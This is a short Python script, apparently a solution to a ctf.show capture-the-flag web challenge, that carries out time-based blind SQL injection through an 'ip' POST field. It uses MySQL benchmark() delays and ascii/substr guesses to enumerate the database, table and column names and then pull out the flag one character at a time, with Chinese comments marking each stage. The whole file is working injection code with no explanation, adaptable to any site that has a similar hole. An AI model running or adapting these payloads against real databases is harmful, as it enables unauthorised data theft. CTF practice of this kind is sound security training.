import requests
import base64

url = "http://3f3bfc95-0c76-43f0-9d82-b6aee6e46cc2.challenge.ctf.show/api/"
result = ""

"""
payload = f"if(1,benchmark(3500000,sha('w')),0)"
request = requests.post(url=url, data={"ip":payload,"debug":"1"})
print(request.text)
time = request.elapsed.total_seconds()
print(f"{time}")

"""

for i in range(1,50):
    p = 1
    for j in range(32,128):

        payload = f"if(ascii(substr(database(),{i},1))={j},benchmark(3500000,sha('w')),0)"
        #尝试数据库名
        payload = f"if(ascii(substr((select table_name from information_schema.tables where table_schema = 'ctfshow_web' limit 0,1),{i},1)) = {j},benchmark(3500000,sha('w')),0)"
        #尝试数据表名
        payload = f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web'and table_name='ctfshow_flagxccb' limit 0,1), {i}, 1)) = {j},benchmark(3500000,sha('w')),0)"
        #尝试列名
        payload = f"if(ascii(substr((select flagaabc from ctfshow_web.ctfshow_flagxccb limit 0,1), {i}, 1)) = {j},benchmark(3500000,sha('w')),0)"
        #尝试flag
        re = requests.post(url=url, data={"ip":payload,"debug":"1"})
        time = re.elapsed.total_seconds()
        if time >= 1:
            result = result + chr(j)
            print(f"result:{result}")
            p = 0
            break
    print("1\n")
    if p == 1:
        print("1")
        break
